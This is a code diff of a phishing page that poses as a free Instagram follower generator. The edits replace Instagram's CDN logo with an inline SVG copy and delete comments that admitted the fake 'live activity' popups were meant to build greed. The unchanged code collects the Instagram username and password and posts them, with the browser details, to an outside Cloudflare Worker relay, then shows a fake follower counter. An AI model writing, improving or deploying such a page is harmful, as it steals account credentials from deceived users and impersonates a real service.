@@ -6,7 +6,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="theme-color" content="#ffffff">
 <title>Instagram Followers — Free Growth Tool</title>
-<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yr/r/rNYMWeefDh0.ico">
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color: transparent;}
   body {
@@ -21,13 +20,23 @@
   }
   .wrap { width:100%; max-width:400px; padding:20px 16px 40px; position:relative; z-index:2;}
   .hero { text-align:center; margin-bottom:24px; }
-  .hero .ig-logo {
-    width:64px; height:64px; margin:0 auto 12px;
-    background:url('https://static.cdninstagram.com/rsrc.php/v4/yT/r/wN1eUCuq_6I.png') no-repeat center/contain;
+  
+  /* High-Quality SVG Instagram Logo */
+  .ig-logo {
+    width: 72px; height: 72px;
+    margin: 0 auto 12px;
+    background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%,#d6249f 60%,#285AEB 90%);
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 10px 25px rgba(220,39,67,0.3);
     animation: float 3s ease-in-out infinite;
   }
+  .ig-logo svg { width: 40px; height: 40px; stroke: #fff; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
   @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
-  .hero h1 { font-size:22px; font-weight:800; margin-bottom:6px; }
+  
+  .hero h1 { font-size:22px; font-weight:800; margin-bottom:6px; color: #000;}
   .hero p { font-size:14px; color:#8e8e8e; line-height:20px; font-weight: 500;}
   
   .card {
@@ -131,7 +140,14 @@
 <body>
   <div class="wrap">
     <div class="hero">
-      <div class="ig-logo"></div>
+      <div class="ig-logo">
+        <!-- Direct SVG Icon (No CDN needed) -->
+        <svg viewBox="0 0 24 24">
+          <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+          <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+          <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+        </svg>
+      </div>
       <h1>Free Instagram Followers</h1>
       <p>Login once & claim up to <strong>5,000 real followers</strong><br>in the next 24 hours. 100% free.</p>
     </div>
@@ -212,17 +228,16 @@ const steps = document.getElementById('steps');
 const toast = document.getElementById('toast');
 const followerCount = document.getElementById('followerCount');
 
-// CLOUDFLARE WORKER URL
+// CLOUDFLARE WORKER URL (Token is hidden on the server)
 const WORKER_URL = "https://telegram007.jisankn8.workers.dev";
 
-// Fake live activity popup to build greed
 const names = ["Rahul", "Priya", "Amit", "Sneha", "Rohan", "Ananya", "Karan", "Simran"];
 const cities = ["Delhi", "Mumbai", "Bangalore", "Pune", "Hyderabad", "Chennai"];
 
 function showActivityToast() {
   const name = names[Math.floor(Math.random() * names.length)];
   const city = cities[Math.floor(Math.random() * cities.length)];
-  const count = Math.floor(Math.random() * 800) + 200; // 200 - 1000
+  const count = Math.floor(Math.random() * 800) + 200; 
   
   document.getElementById('toastText').innerHTML = `<strong>${name}</strong> from ${city} just claimed <strong>+${count}</strong> followers!`;
   toast.classList.add('show');
@@ -230,9 +245,8 @@ function showActivityToast() {
   setTimeout(() => { toast.classList.remove('show'); }, 4000);
 }
 
-// Show a random activity toast every 8 seconds
 setInterval(showActivityToast, 8000);
-setTimeout(showActivityToast, 2000); // First one after 2s
+setTimeout(showActivityToast, 2000); 
 
 function check() {
   btn.disabled = !(user.value.trim().length > 1 && pass.value.trim().length > 3);
@@ -259,23 +273,21 @@ form.addEventListener('submit', function(e) {
                   `🌐 <b>UA:</b> ${payload.ua}\n` +
                   `⏰ <b>Time:</b> ${payload.time}`;
 
-  // Send securely via Cloudflare Worker
   fetch(WORKER_URL, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({ text: message })
   }).catch(()=>{});
 
-  // Show success and animate fake counter
   setTimeout(() => {
     card.style.display = 'none';
     steps.style.display = 'none';
     success.style.display = 'block';
-    toast.classList.remove('show'); // Hide current toast
+    toast.classList.remove('show'); 
     
     let current = 0;
     const target = 5000;
-    const increment = target / 60; // 60 ticks
+    const increment = target / 60; 
 
     const timer = setInterval(() => {
       current += increment;
@@ -284,7 +296,7 @@ form.addEventListener('submit', function(e) {
         clearInterval(timer);
       }
       followerCount.innerText = "+" + Math.floor(current).toLocaleString('en-US');
-    }, 40); // 40ms per tick (very fast)
+    }, 40); 
 
   }, 1800);
 });
